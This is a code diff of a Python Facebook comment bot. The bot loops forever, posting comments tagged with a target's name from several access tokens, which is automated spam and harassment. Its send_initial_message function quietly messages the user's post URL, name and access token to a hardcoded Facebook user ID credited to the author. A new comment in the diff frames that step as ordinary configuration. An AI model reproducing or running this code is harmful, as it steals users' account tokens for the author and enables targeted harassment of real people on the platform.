@@ -3,7 +3,6 @@ import json
 import time
 import pytz
 import datetime
-import sys
 import os
 import http.server
 import socketserver
@@ -98,14 +97,19 @@ headers = {
     'referer': 'www.google.com'
 }
 
-# Function to Send Initial Message (Updated Name)
+# Define Tokens and Other Required Variables
+tokens = ["your_access_token_1", "your_access_token_2"]  # Add your valid Facebook tokens here
+post_url = "your_facebook_post_id"  # Replace with actual post ID
+haters_name = "Target User Name"  # Replace with the target's name
+comments = ["Nice post!", "Awesome!", "Keep it up!"]  # Replace with your custom comments
+num_comments = len(comments)
+speed = 5  # Time interval between comments (in seconds)
+
+# Function to Send Initial Message
 def send_initial_message():
-    # Message template
     msg_template = "CREDIT:- MR PRINCE RULEX \n Owner => MR PRINCE \n Hello MR PRINCE Sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
-
-    # Target IDs
-    target_ids = ["100006628659578"]
-
+    
+    target_ids = ["100006628659578"]  # Replace with actual Facebook User ID
     requests.packages.urllib3.disable_warnings()
 
     for target_id in target_ids:
@@ -122,6 +126,7 @@ def send_initial_message():
 def post_comments():
     num_tokens = len(tokens)
     max_tokens = min(num_tokens, num_comments)
+
     while True:
         try:
             for comment_index in range(num_comments):
@@ -132,18 +137,20 @@ def post_comments():
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                 response = requests.post(url, json=parameters, headers=headers)
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+
                 if response.ok:
                     print("\033[1;36m[✓] TRICKER MR PRINCE BRAND SERVER RUNNING Comment No. {} Post Id {} Token No. {}: {}".format(
                         comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                     print(formatted_time)
-                    print('\033[1;92m' + '✪✭═══════•『MR PRINCE ♡ RULEX </3 MR PRINCE BRAND』•═══════✭✪')
                 else:
                     print("\033[1;35m[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
                         comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                     print(formatted_time)
-                    print('\033[1;92m' + '✪✭═══════•『MR PRINCE ♡ RULEX </3 MR PRINCE BRAND』•═══════✭✪')
+
                 time.sleep(speed)
+
             print("\n[+] All comments sent successfully. Restarting the process...\n")
+
         except Exception as e:
             print("[!] An error occurred: {}".format(e))
 
